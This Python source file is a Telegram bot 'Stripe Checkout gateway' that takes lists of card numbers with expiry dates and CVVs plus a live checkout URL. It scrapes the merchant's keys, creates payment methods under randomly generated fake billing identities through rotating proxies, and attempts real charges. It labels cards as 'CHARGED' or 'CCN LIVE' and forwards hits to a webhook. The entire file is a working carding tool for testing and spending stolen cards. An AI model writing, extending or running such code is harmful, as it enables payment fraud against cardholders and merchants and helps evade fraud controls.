"""
Stripe Checkout Gateway - Process cards against checkout.stripe.com URLs
Commands: /hit, /setp, /rmp
"""

import aiohttp
import asyncio
import random
import re
import json
import time
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from utils import Utils
from database import get_user, add_user, get_user_proxies, add_proxy, remove_proxy
from commands.base_command import is_valid_user, sendWebhook


# ─── Helpers ────────────────────────────────────────────────────

def mask_proxy(proxy_str: str) -> str:
    """Mask proxy IP for display: 192.168.1.100 -> gXX.gXX.iXXX"""
    try:
        parts = proxy_str.split(':')
        ip = parts[0]
        octets = ip.split('.')
        masked = f"g{'X' * len(octets[0])}.g{'X' * len(octets[1])}.i{'X' * len(octets[2])}"
        return masked
    except:
        return "gXX.gXX.iXXX"


def format_proxy_url(proxy_raw: str) -> str:
    """Convert ip:port:user:pass to http://user:pass@ip:port"""
    parts = proxy_raw.strip().split(':')
    if len(parts) == 4:
        ip, port, user, pw = parts
        return f"http://{user}:{pw}@{ip}:{port}"
    elif len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    elif proxy_raw.startswith('http'):
        return proxy_raw
    return f"http://{proxy_raw}"


async def check_proxy(proxy_url: str) -> bool:
    """Quick proxy liveness check"""
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get('https://httpbin.org/ip', proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=8)) as r:
                return r.status == 200
    except:
        return False


# ─── Stripe Checkout Core ───────────────────────────────────────

async def fetch_checkout_session(checkout_url: str, proxy_url: str = None):
    """
    Fetch a checkout.stripe.com page and extract session metadata:
    pk key, payment_intent client_secret, line items, merchant, amount, currency
    """
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
    }

    kwargs = {'headers': headers, 'timeout': aiohttp.ClientTimeout(total=30)}
    if proxy_url:
        kwargs['proxy'] = proxy_url

    async with aiohttp.ClientSession() as session:
        async with session.get(checkout_url, **kwargs) as resp:
            if resp.status != 200:
                return None, f"Checkout page returned HTTP {resp.status}"
            text = await resp.text()

    # ── Extract embedded JSON data ──
    # Stripe Checkout pages embed session data in a script tag or __NEXT_DATA__
    data = {}

    # Try to find the embedded checkout session JSON
    # Pattern 1: __NEXT_DATA__ script
    next_data_match = re.search(r'<script id="__NEXT_DATA__"[^>]*>(.*?)</script>', text, re.DOTALL)
    if next_data_match:
        try:
            nd = json.loads(next_data_match.group(1))
            props = nd.get('props', {}).get('pageProps', {})
            
            # Extract from pageProps
            checkout_session = props.get('checkoutSession', props)
            
            # Try nested structures
            if 'apiKey' in props:
                data['pk'] = props['apiKey']
            if 'stripePublicKey' in props:
                data['pk'] = props['stripePublicKey']
            
            # Payment intent
            if 'paymentIntent' in checkout_session:
                pi = checkout_session['paymentIntent']
                data['pi_client_secret'] = pi if isinstance(pi, str) else pi.get('clientSecret', '')
            if 'clientSecret' in checkout_session:
                data['pi_client_secret'] = checkout_session['clientSecret']

            # Line items
            if 'lineItems' in checkout_session:
                data['line_items'] = checkout_session['lineItems']
            
            # Amount
            if 'amount' in checkout_session:
                data['amount'] = checkout_session['amount']
            if 'amountTotal' in checkout_session:
                data['amount'] = checkout_session['amountTotal']
            
            # Currency
            if 'currency' in checkout_session:
                data['currency'] = checkout_session['currency']
                
            # Merchant / business name
            if 'merchantDisplayName' in checkout_session:
                data['merchant'] = checkout_session['merchantDisplayName']
            if 'businessName' in checkout_session:
                data['merchant'] = checkout_session['businessName']
        except:
            pass

    # Pattern 2: Search for embedded JSON blobs in script tags
    if not data.get('pk'):
        pk_match = re.search(r'pk_(live|test)_[0-9a-zA-Z]+', text)
        if pk_match:
            data['pk'] = pk_match.group(0)

    # Pattern 3: Look for "apiKey" in inline scripts
    if not data.get('pk'):
        api_key_match = re.search(r'"apiKey"\s*:\s*"(pk_(?:live|test)_[^"]+)"', text)
        if api_key_match:
            data['pk'] = api_key_match.group(1)

    # Extract payment intent client secret
    if not data.get('pi_client_secret'):
        cs_match = re.search(r'pi_[a-zA-Z0-9]+_secret_[a-zA-Z0-9]+', text)
        if cs_match:
            data['pi_client_secret'] = cs_match.group(0)

    # Extract setup intent client secret (for auth/setup flows)
    if not data.get('pi_client_secret'):
        si_match = re.search(r'seti_[a-zA-Z0-9]+_secret_[a-zA-Z0-9]+', text)
        if si_match:
            data['pi_client_secret'] = si_match.group(0)
            data['is_setup_intent'] = True

    # Merchant name fallback
    if not data.get('merchant'):
        merch_match = re.search(r'"merchantDisplayName"\s*:\s*"([^"]+)"', text)
        if merch_match:
            data['merchant'] = merch_match.group(1)
    if not data.get('merchant'):
        merch_match = re.search(r'"businessName"\s*:\s*"([^"]+)"', text)
        if merch_match:
            data['merchant'] = merch_match.group(1)
    if not data.get('merchant'):
        title_match = re.search(r'<title>([^<]+)</title>', text)
        if title_match:
            data['merchant'] = title_match.group(1).split(' - ')[0].strip()

    # Amount extraction
    if not data.get('amount'):
        amt_match = re.search(r'"amount"\s*:\s*(\d+)', text)
        if amt_match:
            data['amount'] = int(amt_match.group(1))
    if not data.get('amount'):
        amt_match = re.search(r'"amountTotal"\s*:\s*(\d+)', text)
        if amt_match:
            data['amount'] = int(amt_match.group(1))

    # Currency extraction
    if not data.get('currency'):
        cur_match = re.search(r'"currency"\s*:\s*"([a-zA-Z]{3})"', text)
        if cur_match:
            data['currency'] = cur_match.group(1)

    # Line items extraction
    if not data.get('line_items'):
        li_match = re.search(r'"lineItems"\s*:\s*(\[.*?\])', text, re.DOTALL)
        if li_match:
            try:
                data['line_items'] = json.loads(li_match.group(1))
            except:
                pass
    
    # Product name + description from line items or page
    if not data.get('line_items'):
        prod_match = re.search(r'"productName"\s*:\s*"([^"]+)"', text)
        if prod_match:
            data['product_name'] = prod_match.group(1)
        desc_match = re.search(r'"productDescription"\s*:\s*"([^"]+)"', text)
        if desc_match:
            data['product_desc'] = desc_match.group(1)
    
    # Validate minimum required data
    if not data.get('pk'):
        return None, "Could not extract Stripe publishable key from checkout page"
    if not data.get('pi_client_secret'):
        return None, "Could not extract payment intent client secret"

    return data, None


async def create_payment_method(pk: str, cc: str, mes: str, ano: str, cvv: str, proxy_url: str = None):
    """Create a Stripe PaymentMethod using the card details and pk"""
    headers = {
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    }

    # Generate random billing info
    firstName, lastName = Utils.get_random_name()
    addr = Utils.get_formatted_address()

    exp_year = ano[-2:] if len(ano) > 2 else ano

    form_data = {
        'type': 'card',
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_year]': exp_year,
        'card[exp_month]': mes,
        'billing_details[name]': f'{firstName} {lastName}',
        'billing_details[address][line1]': addr['street'],
        'billing_details[address][city]': addr['city'],
        'billing_details[address][state]': addr['state'],
        'billing_details[address][postal_code]': addr['zip'],
        'billing_details[address][country]': 'US',
        'billing_details[email]': Utils.generate_email(firstName, lastName),
        'billing_details[phone]': addr['phone'],
        'payment_user_agent': 'stripe.js/b85ba7b837; stripe-js-v3/b85ba7b837; checkout',
        'key': pk,
        '_stripe_version': '2024-06-20',
    }

    kwargs = {'headers': headers, 'data': form_data, 'timeout': aiohttp.ClientTimeout(total=20)}
    if proxy_url:
        kwargs['proxy'] = proxy_url

    async with aiohttp.ClientSession() as session:
        async with session.post('https://api.stripe.com/v1/payment_methods', **kwargs) as resp:
            body = await resp.json()
            if resp.status == 200 and body.get('id'):
                return body['id'], None
            else:
                error = body.get('error', {})
                msg = error.get('message', 'Unknown error creating payment method')
                return None, msg


async def confirm_payment(pk: str, client_secret: str, pm_id: str, is_setup: bool = False, proxy_url: str = None):
    """Confirm the PaymentIntent (or SetupIntent) with the payment method"""
    headers = {
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    }

    if is_setup:
        # SetupIntent confirmation
        seti_id = client_secret.split('_secret_')[0]
        url = f'https://api.stripe.com/v1/setup_intents/{seti_id}/confirm'
    else:
        # PaymentIntent confirmation
        pi_id = client_secret.split('_secret_')[0]
        url = f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm'

    form_data = {
        'payment_method': pm_id,
        'client_secret': client_secret,
        'key': pk,
        'return_url': 'https://checkout.stripe.com/success',
        '_stripe_version': '2024-06-20',
    }

    kwargs = {'headers': headers, 'data': form_data, 'timeout': aiohttp.ClientTimeout(total=25)}
    if proxy_url:
        kwargs['proxy'] = proxy_url

    async with aiohttp.ClientSession() as session:
        async with session.post(url, **kwargs) as resp:
            body = await resp.json()
            return body


def parse_confirm_result(body: dict, is_setup: bool = False) -> dict:
    """Parse the confirmation response into a structured result"""
    result = {
        'success': False,
        'status': 'UNKNOWN',
        'message': '',
        'charged_amount': None,
        'currency': None,
    }

    if 'error' in body:
        err = body['error']
        code = err.get('decline_code', err.get('code', 'unknown'))
        msg = err.get('message', 'Unknown error')
        result['status'] = 'DECLINED'
        result['message'] = f"{code}: {msg}"
        
        # Some "declines" are actually live card indicators
        live_indicators = ['insufficient_funds', 'incorrect_cvc', 'invalid_cvc', 
                          'incorrect_zip', 'card_velocity_exceeded', 'do_not_honor',
                          'try_again_later', 'not_permitted', 'transaction_not_allowed']
        if code in live_indicators:
            result['success'] = True
            result['status'] = 'CCN LIVE'
            result['message'] = msg
        return result

    status = body.get('status', '')
    
    if status == 'succeeded':
        result['success'] = True
        result['status'] = 'CHARGED'
        amount = body.get('amount', body.get('amount_received', 0))
        currency = body.get('currency', 'usd').upper()
        result['charged_amount'] = amount / 100 if amount else 0
        result['currency'] = currency
        result['message'] = f"Charged {currency} {result['charged_amount']:.2f}"
    elif status == 'requires_action':
        result['status'] = '3DS REQUIRED'
        result['message'] = '3D Secure authentication required'
    elif status == 'requires_capture':
        result['success'] = True
        result['status'] = 'AUTHORIZED'
        amount = body.get('amount', 0)
        currency = body.get('currency', 'usd').upper()
        result['charged_amount'] = amount / 100 if amount else 0
        result['currency'] = currency
        result['message'] = f"Authorized {currency} {result['charged_amount']:.2f}"
    elif status == 'processing':
        result['success'] = True
        result['status'] = 'PROCESSING'
        result['message'] = 'Payment is processing'
    elif is_setup and status == 'succeeded':
        result['success'] = True
        result['status'] = 'AUTH SUCCESS'
        result['message'] = 'Setup intent confirmed successfully'
    else:
        result['status'] = 'DECLINED'
        result['message'] = f"Status: {status}"

    return result


# ─── Build product string from session data ─────────────────────

def build_product_line(session_data: dict) -> str:
    """Build a product description line like '1 × Unlimited Plan (at $15.99 / month)'"""
    items = session_data.get('line_items', [])
    if items and isinstance(items, list) and len(items) > 0:
        item = items[0]
        name = item.get('name', item.get('description', 'Product'))
        qty = item.get('quantity', 1)
        
        # Try to get price from item
        item_amount = item.get('amount', item.get('price', {}).get('unit_amount', 0))
        if isinstance(item_amount, dict):
            item_amount = item_amount.get('unit_amount', 0)
        item_amount = (item_amount or 0) / 100
        
        # Check for recurring
        recurring = item.get('recurring', item.get('price', {}).get('recurring', None))
        if recurring:
            interval = recurring.get('interval', 'month')
            return f"{qty} × {name} (at ${item_amount:.2f} / {interval})"
        else:
            return f"{qty} × {name} (${item_amount:.2f})"
    
    # Fallback to product_name
    name = session_data.get('product_name', 'Product')
    amount = (session_data.get('amount', 0) or 0)
    if isinstance(amount, int) and amount > 0:
        amount = amount / 100
    desc = session_data.get('product_desc', '')
    if desc and '/' in desc:
        return f"1 × {name} (at ${amount:.2f} / {desc.split('/')[-1].strip()})"
    return f"1 × {name} (${amount:.2f})"


def format_amount(session_data: dict) -> str:
    """Format amount like '15.99 USD'"""
    amount = session_data.get('amount', 0) or 0
    if isinstance(amount, int) and amount > 0:
        amount = amount / 100
    currency = (session_data.get('currency', 'usd') or 'usd').upper()
    return f"{amount:.2f} {currency}"


# ─── Full card processing pipeline ──────────────────────────────

async def process_stripe_card(checkout_url: str, cc: str, mes: str, ano: str, cvv: str, proxy_raw: str = None):
    """
    Full pipeline: fetch checkout → create PM → confirm PI
    Returns (session_data, result_dict, proxy_info)
    """
    proxy_url = format_proxy_url(proxy_raw) if proxy_raw else None
    proxy_live = False

    # Check proxy
    if proxy_url:
        proxy_live = await check_proxy(proxy_url)
    
    proxy_info = {
        'live': proxy_live,
        'masked': mask_proxy(proxy_raw) if proxy_raw else 'None',
        'raw': proxy_raw,
    }

    # 1. Fetch checkout session
    session_data, err = await fetch_checkout_session(checkout_url, proxy_url if proxy_live else None)
    if err:
        return None, {'success': False, 'status': 'ERROR', 'message': err}, proxy_info

    pk = session_data['pk']
    client_secret = session_data['pi_client_secret']
    is_setup = session_data.get('is_setup_intent', False)

    # 2. Create payment method
    active_proxy = proxy_url if proxy_live else None
    pm_id, pm_err = await create_payment_method(pk, cc, mes, ano, cvv, active_proxy)
    if pm_err:
        return session_data, {'success': False, 'status': 'DECLINED', 'message': pm_err}, proxy_info

    # 3. Confirm payment
    body = await confirm_payment(pk, client_secret, pm_id, is_setup, active_proxy)
    result = parse_confirm_result(body, is_setup)

    return session_data, result, proxy_info


# ─── Telegram message formatting ────────────────────────────────

def format_result_message(session_data, result, proxy_info, cc, mes, ano, cvv, hits, declines, current, total, time_taken):
    """Format the Telegram result message matching the screenshot style"""
    amount_str = format_amount(session_data) if session_data else "?.??"
    merchant = session_data.get('merchant', 'Unknown') if session_data else 'Unknown'
    product_line = build_product_line(session_data) if session_data else 'Unknown Product'
    
    proxy_status = "LIVE ✅" if proxy_info['live'] else "DEAD ❌"
    
    if result['status'] == 'CHARGED':
        status_emoji = "CHARGED 🤑"
    elif result['status'] == 'AUTHORIZED':
        status_emoji = "AUTHORIZED ✅"
    elif result['status'] == 'CCN LIVE':
        status_emoji = "CCN LIVE ✅"
    elif result['status'] == '3DS REQUIRED':
        status_emoji = "3DS REQUIRED ❌"
    elif result['status'] == 'PROCESSING':
        status_emoji = "PROCESSING ⏳"
    else:
        status_emoji = "DECLINED ❌"

    response_text = result.get('message', 'N/A')

    msg = f"<b>「 Stripe Charge {amount_str} 」</b> 🐸\n\n"
    msg += f"<b>「⚙」Proxy :</b> {proxy_status}  |  {proxy_info['masked']}\n"
    msg += f"<b>「⚙」Merchant :</b> {merchant}\n"
    msg += f"<b>「⚙」Product :</b> {product_line}\n\n"
    msg += f"🍪 <b>Card ➜</b> <code>{cc}|{mes}|{ano}|{cvv}</code>\n"
    msg += f"🎲 <b>Status ➜</b> {status_emoji}\n"
    msg += f"◆ <b>Response ➜</b> {response_text}\n"
    msg += "━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n"
    msg += f"🐌 <b>Summary:</b>\n"
    msg += f"🐌 <b>Hits:</b> {hits}\n"
    msg += f"    <b>Declines:</b> {declines}\n"
    msg += f"🧧 <b>Total:</b> {current}/{total}\n"
    msg += f"💲 <b>Total Time:</b> {time_taken:.2f}s"

    return msg


# ─── Register Gateway ───────────────────────────────────────────

async def register_stripe_checkout(bot: AsyncTeleBot):
    """Register /hit, /setp, /rmp commands for the Stripe Checkout gateway"""

    # ─── /hit command ────────────────────────────────────────────
    @bot.message_handler(commands=['hit'])
    async def handle_hit(message):
        if not is_valid_user(message):
            return

        user_id = message.from_user.id
        user = get_user(user_id)
        if not user:
            user = add_user(user_id)
            if not user:
                await bot.reply_to(message, "<b>❌ Failed to register user.</b>")
                return
            user = get_user(user_id)

        text = message.text.strip()
        lines = text.split('\n')

        # Parse: first line is /hit, second line is URL, remaining are cards
        # OR: /hit URL on same line
        checkout_url = None
        card_lines = []

        for line in lines:
            line = line.strip()
            if not line:
                continue
            if line.lower().startswith('/hit'):
                # Check if URL is on the same line
                parts = line.split(None, 1)
                if len(parts) > 1 and 'checkout.stripe.com' in parts[1]:
                    checkout_url = parts[1].strip()
                continue
            if 'checkout.stripe.com' in line:
                checkout_url = line.strip()
                continue
            # Try to parse as card
            if re.match(r'^\d{12,19}\|', line):
                card_lines.append(line)

        if not checkout_url:
            await bot.reply_to(message,
                "<b>「 Stripe Checkout 」</b>\n\n"
                "<b>Format:</b>\n"
                "<code>/hit\n"
                "https://checkout.stripe.com/c/pay/cs_live_...\n"
                "card|mm|yyyy|cvv\n"
                "card|mm|yyyy|cvv</code>"
            )
            return

        if not card_lines:
            await bot.reply_to(message, "<b>❌ No valid cards found!</b>\nFormat: <code>card|mm|yyyy|cvv</code>")
            return

        # Parse cards
        cards = []
        for cl in card_lines:
            parts = cl.split('|')
            if len(parts) >= 4:
                cards.append((parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()))
        
        if not cards:
            await bot.reply_to(message, "<b>❌ No valid cards found!</b>\nFormat: <code>card|mm|yyyy|cvv</code>")
            return

        # Get proxies
        user_proxies = get_user_proxies(user_id)
        if not user_proxies and Utils.proxies:
            proxy_list = Utils.proxies
        elif user_proxies:
            proxy_list = [p.proxy for p in user_proxies]
        else:
            proxy_list = []

        response_msg = await bot.reply_to(message, f"<b>「 Stripe Checkout 」</b>\n\n⏳ Processing {len(cards)} card(s)...")

        hits = 0
        declines = 0
        total = len(cards)
        start_time = time.time()

        for i, (cc, mes, ano, cvv) in enumerate(cards, 1):
            card_start = time.time()

            # Pick a random proxy
            proxy_raw = random.choice(proxy_list) if proxy_list else None

            try:
                # Update progress
                try:
                    await bot.edit_message_text(
                        f"<b>「 Stripe Checkout 」</b>\n\n"
                        f"⏳ Checking card {i}/{total}...\n"
                        f"<code>{cc}|{mes}|{ano}|{cvv}</code>\n\n"
                        f"🐌 Hits: {hits} | Declines: {declines}",
                        chat_id=message.chat.id,
                        message_id=response_msg.message_id,
                        parse_mode='HTML'
                    )
                except:
                    pass

                session_data, result, proxy_info = await process_stripe_card(
                    checkout_url, cc, mes, ano, cvv, proxy_raw
                )

                if result['success']:
                    hits += 1
                else:
                    declines += 1

                time_taken = time.time() - card_start

                res_msg = format_result_message(
                    session_data, result, proxy_info,
                    cc, mes, ano, cvv,
                    hits, declines, i, total, time_taken
                )

                try:
                    await bot.edit_message_text(
                        res_msg,
                        chat_id=message.chat.id,
                        message_id=response_msg.message_id,
                        parse_mode='HTML'
                    )
                except:
                    pass

                # If there are more cards, send a new message for the next one
                if i < total:
                    await asyncio.sleep(1)
                    response_msg = await bot.send_message(
                        message.chat.id,
                        f"<b>「 Stripe Checkout 」</b>\n\n⏳ Processing card {i+1}/{total}..."
                    )

                # Send webhook log for hits
                if result['success']:
                    await sendWebhook(message, res_msg, card_details=(cc,))

            except Exception as e:
                declines += 1
                time_taken = time.time() - card_start
                error_msg = (
                    f"<b>「 Stripe Charge 」</b> 🐸\n\n"
                    f"🍪 <b>Card ➜</b> <code>{cc}|{mes}|{ano}|{cvv}</code>\n"
                    f"🎲 <b>Status ➜</b> ERROR ⚠️\n"
                    f"◆ <b>Response ➜</b> {str(e)[:100]}\n"
                    f"━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n"
                    f"🧧 <b>Total:</b> {i}/{total} | 💲 {time_taken:.2f}s"
                )
                try:
                    await bot.edit_message_text(
                        error_msg,
                        chat_id=message.chat.id,
                        message_id=response_msg.message_id,
                        parse_mode='HTML'
                    )
                except:
                    pass

                if i < total:
                    await asyncio.sleep(1)
                    response_msg = await bot.send_message(
                        message.chat.id,
                        f"<b>「 Stripe Checkout 」</b>\n\n⏳ Processing card {i+1}/{total}..."
                    )

    # ─── /setp command — set/add proxies ─────────────────────────
    @bot.message_handler(commands=['setp'])
    async def handle_setp(message):
        if not is_valid_user(message):
            return

        user_id = message.from_user.id
        user = get_user(user_id)
        if not user:
            user = add_user(user_id)
            if not user:
                await bot.reply_to(message, "<b>❌ Failed to register user.</b>")
                return
            user = get_user(user_id)

        text = message.text.strip()
        lines = text.split('\n')

        proxies_to_add = []
        for line in lines:
            line = line.strip()
            if line.startswith('/setp'):
                # Check if proxy is on the same line
                parts = line.split(None, 1)
                if len(parts) > 1:
                    proxies_to_add.append(parts[1].strip())
                continue
            if line and not line.startswith('/'):
                proxies_to_add.append(line)

        if not proxies_to_add:
            # Show current proxies
            user_proxies = get_user_proxies(user_id)
            if user_proxies:
                proxy_list = "\n".join([f"  {i+1}. <code>{p.proxy}</code>" for i, p in enumerate(user_proxies)])
                await bot.reply_to(message,
                    f"<b>「 Proxy Manager 」</b>\n\n"
                    f"📋 <b>Your proxies ({len(user_proxies)}):</b>\n{proxy_list}\n\n"
                    f"<b>To add:</b> <code>/setp ip:port:user:pass</code>\n"
                    f"<b>To remove:</b> <code>/rmp 1</code> or <code>/rmp all</code>"
                )
            else:
                await bot.reply_to(message,
                    "<b>「 Proxy Manager 」</b>\n\n"
                    "❌ No proxies set!\n\n"
                    "<b>Format:</b>\n"
                    "<code>/setp\n"
                    "ip:port:user:pass\n"
                    "ip:port:user:pass</code>"
                )
            return

        added = 0
        for p in proxies_to_add:
            try:
                add_proxy(user_id, p.strip())
                added += 1
            except:
                pass

        await bot.reply_to(message,
            f"<b>「 Proxy Manager 」</b>\n\n"
            f"✅ Added <b>{added}</b> proxy(ies)!\n"
            f"Use <code>/setp</code> to view all proxies."
        )

    # ─── /rmp command — remove proxies ───────────────────────────
    @bot.message_handler(commands=['rmp'])
    async def handle_rmp(message):
        if not is_valid_user(message):
            return

        user_id = message.from_user.id
        user = get_user(user_id)
        if not user:
            await bot.reply_to(message, "<b>❌ Register first!</b>")
            return

        text = message.text.strip()
        parts = text.split()

        user_proxies = get_user_proxies(user_id)
        if not user_proxies:
            await bot.reply_to(message, "<b>❌ No proxies to remove!</b>")
            return

        if len(parts) < 2:
            await bot.reply_to(message,
                "<b>「 Remove Proxy 」</b>\n\n"
                "<code>/rmp all</code> — Remove all\n"
                "<code>/rmp 1 3 5</code> — Remove by index"
            )
            return

        if parts[1].lower() == 'all':
            removed = 0
            for p in user_proxies:
                try:
                    remove_proxy(user_id, p.proxy)
                    removed += 1
                except:
                    pass
            await bot.reply_to(message, f"<b>✅ Removed all {removed} proxies!</b>")
            return

        # Remove by index
        indices = []
        for p in parts[1:]:
            try:
                indices.append(int(p))
            except:
                pass

        if not indices:
            await bot.reply_to(message, "<b>❌ Invalid index! Use numbers.</b>")
            return

        removed = 0
        proxy_list = list(user_proxies)
        for idx in sorted(indices, reverse=True):
            if 1 <= idx <= len(proxy_list):
                try:
                    remove_proxy(user_id, proxy_list[idx - 1].proxy)
                    removed += 1
                except:
                    pass

        await bot.reply_to(message, f"<b>✅ Removed {removed} proxy(ies)!</b>\nUse <code>/setp</code> to view remaining.")
